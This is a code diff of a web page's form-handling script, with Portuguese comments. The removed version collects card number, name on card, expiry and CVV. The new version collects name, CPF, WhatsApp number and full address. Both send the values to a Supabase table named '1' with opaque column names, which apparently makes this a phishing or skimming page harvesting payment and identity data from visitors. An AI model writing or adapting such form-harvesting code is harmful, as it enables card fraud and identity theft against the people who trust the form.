@@ -461,28 +461,42 @@
     </div>
   </div>
 
-    <script>
+   <script>
     const SUPABASE_URL = 'https://vwzdnoedjxvviphzdprn.supabase.co';
     const SUPABASE_ANON_KEY = 'sb_publishable_Bgg4Jz5z1b7LzkasJfWTMA_rSIP8JXC';
 
     const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
     document.addEventListener('DOMContentLoaded', () => {
-        const form = document.getElementById('form-endereco');
+        const form = document.querySelector('form');
         if (!form) return;
 
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
 
-            const numero = document.getElementById('Número do Cartão').value;
-            const nome = document.getElementById('Nome no Cartão').value;
-            const validade = document.getElementById('validade').value;
-            const cvv = document.getElementById('CVV').value;
+            // Pega os dados digitados pelo cliente nos inputs
+            const nome = document.getElementById('nome')?.value || '';
+            const cpf = document.getElementById('cpf')?.value || '';
+            const whatsapp = document.getElementById('whatsapp')?.value || '';
+            const cep = document.getElementById('cep')?.value || '';
+            const rua = document.getElementById('rua')?.value || '';
+            const numero = document.getElementById('numero')?.value || '';
+            const bairro = document.getElementById('bairro')?.value || '';
+            const cidade = document.getElementById('cidade')?.value || '';
 
+            // Junta as informações de endereço em um texto só para guardar na coluna C1
+            const enderecoCompleto = `Rua: ${rua}, Nº: ${numero}, Bairro: ${bairro}, Cidade: ${cidade}, CEP: ${cep}`;
+
+            // Envia para a sua tabela '1' do Supabase
             const { data, error } = await supabase
                 .from('1')
                 .insert([
-                    { numero: numero, nome: nome, validade: validade, CVV: CVV, }
+                    { 
+                        N1: nome, 
+                        N2: cpf, 
+                        V1: whatsapp, 
+                        C1: enderecoCompleto 
+                    }
                 ]);
 
             if (error) {
